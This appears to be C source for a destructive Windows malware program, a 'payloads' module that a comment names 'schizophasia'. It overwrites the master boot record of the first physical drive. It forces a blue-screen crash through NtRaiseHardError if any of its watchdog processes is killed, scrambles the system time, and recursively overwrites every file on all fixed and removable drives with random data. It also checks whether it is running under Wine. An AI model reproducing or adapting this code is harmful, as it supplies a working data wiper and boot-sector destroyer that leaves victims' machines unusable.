#include "miscpayloads.h"

VOID WINAPI fnChangeMBR(VOID) {

	if(g_bDebug == TRUE)
		return;

	DWORD dwToWrite = sizeof(g_adwBootSector) / sizeof(g_adwBootSector[0]);
	DWORD dwWritten = sizeof(g_adwBootSector) / sizeof(g_adwBootSector[0]);

	HANDLE hFile = CreateFileW(
		TEXT("\\\\.\\PhysicalDrive0\0"), 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	

	if (hFile !=NULL && WriteFile(
		hFile,
		g_adwBootSector,
		dwToWrite,
		&dwWritten,
		NULL))
	{
		CloseHandle(hFile);
	}
	
	else {

		CloseHandle(hFile);

		MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[1],
			g_alpszTitles[8],
			MB_OK |MB_ICONQUESTION);

		ExitProcess(EXIT_FAILURE);
	}
	
}

VOID WINAPI fnProcessWatchdog(VOID) {

	PROCESSENTRY32W pwProcEntry32;

	HANDLE hProcessSnapshot = NULL,
		hProcess = NULL;


	ZeroMemory(
		&pwProcEntry32, 
		sizeof(PROCESSENTRY32W)
		);

	DWORD dwNumberOfMalwareProcesses1 = 0,
		dwProcessCountTemp = 0;

	LPWSTR pszCurrentProcessName[MAX_PATH],
		pszProcessName1[MAX_PATH];

	ZeroMemory(
		pszCurrentProcessName, 
		MAX_PATH
		);

	ZeroMemory(
		pszProcessName1, 
		MAX_PATH
		);

	pwProcEntry32.dwSize = sizeof(PROCESSENTRY32W);

	GetProcessImageFileNameW(
		GetCurrentProcess(), 
		(LPWSTR)pszCurrentProcessName, 
		MAX_PATH
		);

		while (TRUE) {

			 hProcessSnapshot = CreateToolhelp32Snapshot(
				TH32CS_SNAPPROCESS,
				0); // Get snapshot of all processes in the system.

			Process32FirstW(
				hProcessSnapshot, 
				&pwProcEntry32
				); // Set the PROCESSENTRY32W structure to the first process in the snapshot

			while (Process32NextW(
				hProcessSnapshot, 
				&pwProcEntry32) == TRUE
				) {

				hProcess = OpenProcess(
					PROCESS_ALL_ACCESS, 
					FALSE, 
					pwProcEntry32.th32ProcessID
					); // Get process's handle.

				GetProcessImageFileNameW(
					hProcess, 
					(LPWSTR)pszProcessName1, 
					MAX_PATH
					);
				
				if (wcscmp(
					(LPWSTR)pszCurrentProcessName, 
					(LPWSTR)pszProcessName1) == 0
					) //If strings containing this and other process with the same match, increment.
					dwNumberOfMalwareProcesses1++;

				ZeroMemory(
					pszProcessName1, 
					MAX_PATH
					);

				CloseHandle(hProcess); // Close the process handle.

				Sleep(5);

			}; // Repeat until there are no more processes left in the snapshot.

			CloseHandle(hProcessSnapshot);

			if (dwNumberOfMalwareProcesses1 < dwProcessCountTemp) {

				ZeroMemory(
					pszCurrentProcessName, 
					MAX_PATH
					);

				ZeroMemory(
					pszProcessName1, 
					MAX_PATH
					);

				dwNumberOfMalwareProcesses1 = 0;

				dwProcessCountTemp = 0;

				fnCauseBugcheck();
				ExitProcess(EXIT_SUCCESS);
			}

			else {
				dwProcessCountTemp = dwNumberOfMalwareProcesses1;
				dwNumberOfMalwareProcesses1 = 0;
			}
				/*We store the previous value which we got from comparing process names in another variable.
				* Make original var equal to zero.
				* After running the cycle again, compare it to the new one and if it's less - crash the system with a random ntstatus.
				* This would prevent schizophasia from being closed as all it's processess monitor each other*/
				/*Wide charecter strings were used because you can't always expect the file to have a name with only latin charenters*/
}
	
	}

VOID WINAPI fnCauseBugcheck(VOID) {
		if(g_bDebug == TRUE)
			return;

	PVOID pvVoid = NULL;
	
	HMODULE hNTDLL = GetModuleHandleW(TEXT("ntdll.dll\0"));

	if (hNTDLL == NULL) {

		MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[7],
			g_alpszTitles[9],
			MB_OK | MB_ICONERROR
		);
		ExitProcess(EXIT_FAILURE);
	}

	_RtlAdjustPrivilege RtlAdjustPrivilege = (NTSTATUS*) GetProcAddress
		(
		hNTDLL,
		"RtlAdjustPrivilege\0"
		); // Gets privilege adjustment function from ntdll

	_NtRaiseHardError NtRaiseHardError = (NTSTATUS*) GetProcAddress
		(
		hNTDLL,
		"NtRaiseHardError\0"
		); // Gets the NtRaiseHardError function address from ntdll, used for messageboxes and most importantly to initiate a bugcheck

 		// Get the shutdown privilege, i have it defined for better readability

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL && RtlAdjustPrivilege(
		SE_SHUTDOWN_PRIVILEGE, 
		TRUE, 
		FALSE, 
		(PBOOLEAN)&pvVoid) == STATUS_SUCCESS
		) {

		NtRaiseHardError(
			g_alBugcheckStatus[fnRNG()%3],
			0, 0, 
			NULL, 6, 
			(PULONG)&pvVoid
		); 
		FreeLibrary(hNTDLL);
	}

	else {
		FreeLibrary(hNTDLL);
		MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[2],
			g_alpszTitles[4],
			MB_OK | MB_ICONQUESTION);
		ExitProcess(EXIT_FAILURE);
	}
}

BOOL WINAPI fnCheckWine(VOID) {

	if(g_bDebug == TRUE)
		return FALSE;

	HMODULE hNTDLL = GetModuleHandleW(TEXT("ntdll.dll\0"));

	if (hNTDLL == NULL) {
		MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[7],
			g_alpszTitles[9],
			MB_OK | MB_ICONERROR
		);
	}

	_wine_get_version wine_get_version = (LPCSTR) GetProcAddress
	(
		hNTDLL,
		"wine_get_version\0"
	);

	if (wine_get_version != NULL) {
		FreeLibrary(hNTDLL);

		MessageBoxW(
			NULL,
			g_alpszMessageBoxTexts[9],
			g_alpszTitles[10],
			MB_OK | MB_ICONEXCLAMATION
		);
		return TRUE;
	}

	else {
		FreeLibrary(hNTDLL);
		return FALSE;
	}

}

VOID WINAPI fnSetRandomTime(VOID) {

	SYSTEMTIME stSystemTime;

	while(g_iGDIPayloadCount != 6) {

		stSystemTime.wYear = rand()%2030;
		stSystemTime.wMonth = rand()%12;
		stSystemTime.wHour = rand()%23;
		stSystemTime.wMinute = rand()%59;
		stSystemTime.wDay = rand()%31;
		stSystemTime.wDayOfWeek = rand()%6;
		stSystemTime.wSecond = rand()%59;
		stSystemTime.wMilliseconds = rand()%999;

		Sleep(100);
		SetSystemTime(&stSystemTime);

		}

	ExitThread(EXIT_SUCCESS);
	}

ULONG WINAPI fnRNG(VOID) {

	HMODULE hNTDLL = GetModuleHandleW(TEXT("ntdll.dll\0"));

		if (hNTDLL == NULL)
			MessageBoxW(
				NULL,
				g_alpszMessageBoxTexts[7],
				g_alpszTitles[9],
				MB_OK | MB_ICONERROR
			);

		
	_RtlRandom RtlRandom = (PULONG) GetProcAddress
	(
		hNTDLL,
		"RtlRandom\0"
	);

	if(RtlRandom != NULL) {

		ULONG uResult = RtlRandom(&g_uRngSeed);
		FreeLibrary(hNTDLL);
		return uResult;
	}

	else return 0;

}

/* The file corruptor part
fnFindVolumes finds all avalible fixed and removable volumes and passes the path to the corruptor function which runs in a separate thread
*/

VOID WINAPI fnFindVolumes(VOID) {

	if(g_bDebug == TRUE) return;

	WCHAR szVolName[MAX_PATH],
		  szVolPath[MAX_PATH];

	DWORD dwRetLength = MAX_PATH;

	HANDLE hVolumeHandle = FindFirstVolumeW(
  				szVolName,
  				MAX_PATH
				);

	if(
	GetDriveTypeW(szVolName) == DRIVE_FIXED || //hard disks, stuff like that
	GetDriveTypeW(szVolName) == DRIVE_REMOVABLE &&  //flash drives and external media
	GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR && // to skip empty drives where there isn't anything connected(card readers)
	GetDriveTypeW(szVolName) != DRIVE_CDROM
	) {
				GetVolumePathNamesForVolumeNameW(
					szVolName,
					szVolPath,
					MAX_PATH,
					&dwRetLength
				);

		if(wcscmp(
			szVolPath,
			TEXT("\0")) !=0)
				CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnFileCorruptor, 
				szVolPath, 
				0,
				NULL
				);
		Sleep(1000);
		}
	while(
		FindNextVolumeW(
			hVolumeHandle,
			szVolName,
			MAX_PATH
			)
		) {

			if(
			GetDriveTypeW(szVolName) == DRIVE_FIXED ||
			GetDriveTypeW(szVolName) == DRIVE_REMOVABLE && 
			GetDriveTypeW(szVolName) != DRIVE_NO_ROOT_DIR &&
			GetDriveTypeW(szVolName) != DRIVE_CDROM
			) {
					GetVolumePathNamesForVolumeNameW(
					szVolName,
					szVolPath,
					MAX_PATH,
					&dwRetLength
				);

		if(wcscmp(
			szVolPath,
			TEXT("\0")) !=0
		)
				CreateThread(
				NULL, 
				0, 
				(LPTHREAD_START_ROUTINE)fnFileCorruptor, 
				szVolPath, 
				0, 
				NULL
				);
		Sleep(1000);
		}
	}
	FindVolumeClose(hVolumeHandle);
}

VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {

	LPWSTR lpszVolumeName[MAX_PATH];

	wcscpy(
		(LPWSTR)lpszVolumeName,
		lpszVolumeArg
		);

	INT iBufferRandom[4096];

	DWORD dwToWrite = sizeof(iBufferRandom) / sizeof(iBufferRandom[0]);
	DWORD dwWritten = sizeof(iBufferRandom) / sizeof(iBufferRandom[0]);

	//This function recursively searches for all the files on a volume and replaces their contents with random numbers
	WCHAR szVolumeLocal[MAX_PATH];

	WIN32_FIND_DATAW stFileFind;

	PathCombineW(
		szVolumeLocal, 
		(LPWSTR)lpszVolumeName, 
		TEXT("*\0")
		);
	
	 HANDLE hFFileHandle = FindFirstFileW(
		szVolumeLocal, 
		&stFileFind
		);

	if(hFFileHandle != INVALID_HANDLE_VALUE) {
		do {
			if(stFileFind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
			wcscmp(
				stFileFind.cFileName,
				TEXT("..\0")) !=0 && 
			wcscmp(
				stFileFind.cFileName,
				TEXT(".\0")) != 0
				) {
				PathCombineW(
					szVolumeLocal, 
					(LPWSTR)lpszVolumeName, 
					stFileFind.cFileName
					);
				fnFileCorruptor(szVolumeLocal);
			}
		} while(
			FindNextFileW(
			hFFileHandle, 
			&stFileFind)
		);

		FindClose(hFFileHandle);
	}

	PathCombineW(
		szVolumeLocal, 
		(LPWSTR)lpszVolumeName, 
		TEXT("*\0")
		);

	hFFileHandle = FindFirstFileW(
		szVolumeLocal, 
		&stFileFind
		);
	if(hFFileHandle != INVALID_HANDLE_VALUE) {
				do {
			if((stFileFind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FALSE) {
				PathCombineW(
					szVolumeLocal, 
					(LPWSTR)lpszVolumeName, 
					stFileFind.cFileName
					);

					for(INT iA = 0; iA<sizeof(iBufferRandom) / sizeof(iBufferRandom[0]); iA++) {
						iBufferRandom[iA] = fnRNG()%876738;
					}

				HANDLE hFile = CreateFileW(
					szVolumeLocal, 
					GENERIC_WRITE, 
					FILE_SHARE_WRITE, 
					NULL,
					OPEN_EXISTING,
					0,
					NULL
					);

					if(hFile != NULL) {
						WriteFile(
							hFile,
							iBufferRandom,
							dwToWrite,
							&dwWritten,
							NULL
							);

					CloseHandle(hFile);
					}
					
					if(g_iGDIPayloadCount == 7) 
						ExitThread(EXIT_SUCCESS);

			}
		} while(FindNextFileW(
			hFFileHandle, 
			&stFileFind)
		);
		FindClose(hFFileHandle);
	}
	
}
